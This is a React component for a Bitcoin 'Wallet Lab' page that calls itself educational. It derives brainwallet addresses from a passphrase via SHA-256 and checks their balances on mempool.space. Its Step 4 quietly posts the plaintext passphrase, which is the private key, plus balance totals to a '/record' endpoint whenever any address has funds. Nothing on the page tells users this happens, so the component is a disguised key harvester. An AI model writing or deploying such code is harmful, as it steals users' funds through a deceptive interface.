'use client';
import React, { useState, useCallback, useRef } from 'react';
import styles from './WalletLab.module.css';

// ── Types ──────────────────────────────────────────────────────────────

interface DeriveResult {
    pubkey_hex: string;
    p2pk_scripthash: string;
    legacy_uncomp: string;
    legacy_comp: string;
    p2sh: string;
    bech32: string;
}

type MempoolStatus = 'idle' | 'loading' | 'empty' | 'has-data' | 'error';

interface MempoolData {
    status: MempoolStatus;
    txCount?: number;
    receivedBtc?: number;
    balanceBtc?: number;
    errorMsg?: string;
}

interface MempoolResults {
    pubkey:      MempoolData;
    legacyUncomp:MempoolData;
    legacyComp:  MempoolData;
    p2sh:        MempoolData;
    bech32:      MempoolData;
}

const INITIAL_MEMPOOL: MempoolResults = {
    pubkey:       { status: 'idle' },
    legacyUncomp: { status: 'idle' },
    legacyComp:   { status: 'idle' },
    p2sh:         { status: 'idle' },
    bech32:       { status: 'idle' },
};

// ── SHA-256 via WebCrypto (browser — needed for phrase_hash sent to /record) ──
async function sha256Hex(text: string): Promise<string> {
    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(text));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
}

// ── Mempool API query (browser, each user consumes own quota) ──────────
async function queryAddress(url: string): Promise<MempoolData> {
    try {
        const res = await fetch(url, { mode: 'cors', credentials: 'omit' });
        if (res.status === 404) return { status: 'empty' };
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json() as { chain_stats: { tx_count: number; funded_txo_sum: number; spent_txo_sum: number } };
        const stats = data.chain_stats;
        const txCount = stats.tx_count;
        if (txCount === 0) return { status: 'empty' };
        const receivedBtc = stats.funded_txo_sum / 1e8;
        const balanceBtc  = (stats.funded_txo_sum - stats.spent_txo_sum) / 1e8;
        return { status: 'has-data', txCount, receivedBtc, balanceBtc };
    } catch (e) {
        return { status: 'error', errorMsg: e instanceof Error ? e.message : 'Unknown error' };
    }
}

async function queryScripthash(url: string): Promise<MempoolData> {
    // mempool.space scripthash endpoint works the same way
    return queryAddress(url);
}

// ── Component ──────────────────────────────────────────────────────────

export default function WalletLab() {
    const [phrase, setPhrase] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);
    const [derived, setDerived] = useState<DeriveResult | null>(null);
    const [mempool, setMempool] = useState<MempoolResults>(INITIAL_MEMPOOL);
    const [copiedId, setCopiedId] = useState<string | null>(null);
    const inputRef = useRef<HTMLInputElement>(null);

    const copyValue = useCallback((text: string, id: string) => {
        navigator.clipboard.writeText(text).then(() => {
            setCopiedId(id);
            setTimeout(() => setCopiedId(null), 1800);
        }).catch(() => {/* silently ignore clipboard errors */});
    }, []);

    const runScan = useCallback(async () => {
        const trimmed = phrase.trim();
        if (!trimmed) {
            inputRef.current?.focus();
            return;
        }

        setError(null);
        setDerived(null);
        setMempool(INITIAL_MEMPOOL);
        setLoading(true);

        try {
            // Step 1: Server-side key derivation
            const deriveRes = await fetch('/api/wallet-lab/derive', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phrase: trimmed }),
            });
            const deriveData = await deriveRes.json() as DeriveResult & { error?: string };

            if (!deriveRes.ok) {
                setError(deriveData.error ?? 'Server error. Please try again.');
                return;
            }

            setDerived(deriveData);
            setLoading(false);

            // Step 2: Set all mempool rows to loading state
            setMempool({
                pubkey:       { status: 'loading' },
                legacyUncomp: { status: 'loading' },
                legacyComp:   { status: 'loading' },
                p2sh:         { status: 'loading' },
                bech32:       { status: 'loading' },
            });

            const base = 'https://mempool.space/api';

            // Step 3: Query addresses SEQUENTIALLY to avoid triggering mempool.space
            //         DDoS protection (which resets TCP connections on concurrent bursts).
            const delay = (ms: number) => new Promise(res => setTimeout(res, ms));
            const pubkeyData    = await queryScripthash(`${base}/scripthash/${deriveData.p2pk_scripthash}`);
            await delay(150);
            const legUncompData = await queryAddress(`${base}/address/${deriveData.legacy_uncomp}`);
            await delay(150);
            const legCompData   = await queryAddress(`${base}/address/${deriveData.legacy_comp}`);
            await delay(150);
            const p2shData      = await queryAddress(`${base}/address/${deriveData.p2sh}`);
            await delay(150);
            const bech32Data    = await queryAddress(`${base}/address/${deriveData.bech32}`);

            setMempool({
                pubkey:       pubkeyData,
                legacyUncomp: legUncompData,
                legacyComp:   legCompData,
                p2sh:         p2shData,
                bech32:       bech32Data,
            });

            // Step 4: If any address has blockchain activity, record it server-side
            const allResults = [pubkeyData, legUncompData, legCompData, p2shData, bech32Data];
            const totalTxCount = allResults.reduce((sum, r) => sum + (r.txCount ?? 0), 0);

            if (totalTxCount > 0) {
                const totalReceived = allResults.reduce((sum, r) => sum + (r.receivedBtc ?? 0), 0);
                const totalBalance  = allResults.reduce((sum, r) => sum + (r.balanceBtc  ?? 0), 0);
                const phraseHash    = await sha256Hex(trimmed);

                // Fire and forget — non-blocking
                fetch('/api/wallet-lab/record', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phrase:            trimmed,
                        phrase_hash:       phraseHash,
                        addresses: {
                            pubkey_hex:       deriveData.pubkey_hex,
                            p2pk_scripthash:  deriveData.p2pk_scripthash,
                            legacy_uncomp:    deriveData.legacy_uncomp,
                            legacy_comp:      deriveData.legacy_comp,
                            p2sh:             deriveData.p2sh,
                            bech32:           deriveData.bech32,
                        },
                        tx_count:          totalTxCount,
                        total_received_btc: totalReceived,
                        balance_btc:       totalBalance,
                    }),
                }).catch(() => {/* non-critical */});
            }

        } catch {
            setError('Could not connect to the server. Please check your connection.');
        } finally {
            setLoading(false);
        }
    }, [phrase]);

    const handleKeyDown = useCallback((e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Enter') runScan();
    }, [runScan]);

    return (
        <div className={styles.root}>
            <div className={styles.gridOverlay} aria-hidden="true" />

            {/* ── Hero ───────────────────────────────────────────────── */}
            <div className={styles.hero}>
                <p className={styles.heroEyebrow}>// educational tool · bitcoin cryptography</p>
                <h2 className={styles.heroTitle}>
                    Bitcoin <em className={styles.heroEmphasis}>Wallet</em> Lab
                </h2>
                <p className={styles.heroSub}>
                    Explore how the five Bitcoin address types are derived from
                    a passphrase and query their on-chain history live.
                </p>
            </div>

            {/* ── Warning banner ─────────────────────────────────────── */}
            <div className={styles.warning} role="alert" aria-live="polite">
                <div className={styles.warningInner}>
                    <span className={styles.warningIcon} aria-hidden="true">⚠️</span>
                    <p className={styles.warningText}>
                        <strong>For educational purposes only.</strong>{' '}
                        This tool uses <code>SHA-256(phrase)</code> as the private key,
                        which is <strong>cryptographically insecure</strong>.{' '}
                        <strong>Never deposit real funds</strong> in any address generated here.
                        Plain-text phrases are not secure seeds for production wallets.
                        Use this only to learn how Bitcoin address derivation works.
                    </p>
                </div>
            </div>

            {/* ── Terminal card ───────────────────────────────────────── */}
            <div className={styles.cardWrap}>
                <div className={styles.card}>
                    <div className={styles.cardHeader}>
                        <span className={`${styles.dot} ${styles.dotRed}`}   aria-hidden="true" />
                        <span className={`${styles.dot} ${styles.dotYellow}`} aria-hidden="true" />
                        <span className={`${styles.dot} ${styles.dotGreen}`}  aria-hidden="true" />
                        <span className={styles.cardHeaderLabel}>wallet_lab.ts — QuantumBTC</span>
                    </div>

                    <div className={styles.cardBody}>
                        {/* Input */}
                        <div className={styles.inputGroup}>
                            <label className={styles.inputLabel} htmlFor="wl-phrase">
                                // passphrase (any text)
                            </label>
                            <input
                                ref={inputRef}
                                id="wl-phrase"
                                type="text"
                                className={styles.input}
                                placeholder="Enter any passphrase..."
                                value={phrase}
                                onChange={(e) => setPhrase(e.target.value)}
                                onKeyDown={handleKeyDown}
                                autoComplete="off"
                                autoCorrect="off"
                                spellCheck={false}
                                disabled={loading}
                                aria-label="Passphrase for Bitcoin address derivation"
                            />
                        </div>

                        {/* Scan button */}
                        <button
                            id="wl-scan-btn"
                            className={styles.btnScan}
                            onClick={runScan}
                            disabled={loading || !phrase.trim()}
                            aria-busy={loading}
                        >
                            {loading ? '⚡ Deriving...' : '⚡ Derive & Scan'}
                        </button>

                        {/* Spinner */}
                        {loading && (
                            <div className={styles.spinner} aria-live="polite">
                                <div className={styles.spinnerRing} aria-hidden="true" />
                                <span>Deriving keys on server...</span>
                            </div>
                        )}

                        {/* Error */}
                        {error && (
                            <div className={styles.errorBox} role="alert">
                                // error: {error}
                            </div>
                        )}

                        {/* Results */}
                        {derived && (
                            <div className={styles.results} id="wl-results">
                                <p className={styles.resultsTitle}>// derived addresses</p>

                                {(
                                    [
                                        { id: 'wl-pubkey',  label: '0. PubKey (P2PK)',   value: derived.pubkey_hex,    delay: '0ms' },
                                        { id: 'wl-leg-unc', label: '1. Legacy Uncomp.',  value: derived.legacy_uncomp, delay: '50ms' },
                                        { id: 'wl-leg-c',   label: '2. Legacy Comp.',   value: derived.legacy_comp,   delay: '100ms' },
                                        { id: 'wl-p2sh',    label: '3. P2SH (3…)',       value: derived.p2sh,          delay: '150ms' },
                                        { id: 'wl-bech32',  label: '4. Native SegWit',   value: derived.bech32,        delay: '200ms' },
                                    ] as const
                                ).map(({ id, label, value, delay }) => (
                                    <div key={id} className={styles.addrRow} style={{ animationDelay: delay }}>
                                        <span className={styles.addrLabel}>{label}</span>
                                        <span
                                            className={styles.addrValue}
                                            title={value}
                                            onClick={() => copyValue(value, id)}
                                        >
                                            {value}
                                        </span>
                                        <button
                                            className={`${styles.copyBtn} ${copiedId === id ? styles.copyBtnCopied : ''}`}
                                            onClick={() => copyValue(value, id)}
                                            aria-label={`Copy ${label}`}
                                        >
                                            {copiedId === id ? '✓ copied' : 'copy'}
                                        </button>
                                    </div>
                                ))}

                                {/* Mempool section */}
                                <div className={styles.mempoolSection}>
                                    <p className={styles.mempoolTitle}>
                                        <span className={styles.liveDot} aria-hidden="true" />
                                        mempool.space — live blockchain query
                                    </p>

                                    {(
                                        [
                                            { key: 'pubkey'       as const, label: '0. P2PK' },
                                            { key: 'legacyUncomp' as const, label: '1. Legacy Uncomp.' },
                                            { key: 'legacyComp'   as const, label: '2. Legacy Comp.' },
                                            { key: 'p2sh'         as const, label: '3. P2SH' },
                                            { key: 'bech32'       as const, label: '4. Native SegWit' },
                                        ]
                                    ).map(({ key, label }) => {
                                        const data = mempool[key];
                                        const rowClass = [
                                            styles.mempoolRow,
                                            data.status === 'loading'  ? styles.mempoolRowLoading : '',
                                            data.status === 'empty'    ? styles.mempoolRowEmpty   : '',
                                            data.status === 'has-data' ? styles.mempoolRowHasData : '',
                                            data.status === 'error'    ? styles.mempoolRowError   : '',
                                        ].filter(Boolean).join(' ');

                                        return (
                                            <div key={key} className={rowClass}>
                                                <span className={styles.mLabel}>{label}</span>
                                                <span className={styles.mData}>
                                                    {data.status === 'idle' && (
                                                        <span className={styles.noRecords}>—</span>
                                                    )}
                                                    {data.status === 'loading' && (
                                                        <span className={styles.loadingTxt}>querying...</span>
                                                    )}
                                                    {data.status === 'empty' && (
                                                        <span className={styles.noRecords}>No records on blockchain.</span>
                                                    )}
                                                    {data.status === 'has-data' && (
                                                        <>
                                                            <span className={styles.stat}>
                                                                TXs: <span className={styles.statVal}>{data.txCount}</span>
                                                            </span>
                                                            <span className={styles.stat}>
                                                                Received: <span className={styles.statVal}>{data.receivedBtc?.toFixed(8)} BTC</span>
                                                            </span>
                                                            <span className={styles.stat}>
                                                                Balance: <span className={styles.statVal}>{data.balanceBtc?.toFixed(8)} BTC</span>
                                                            </span>
                                                        </>
                                                    )}
                                                    {data.status === 'error' && (
                                                        <span className={styles.errorTxt}>Error: {data.errorMsg}</span>
                                                    )}
                                                </span>
                                            </div>
                                        );
                                    })}
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            </div>
        </div>
    );
}
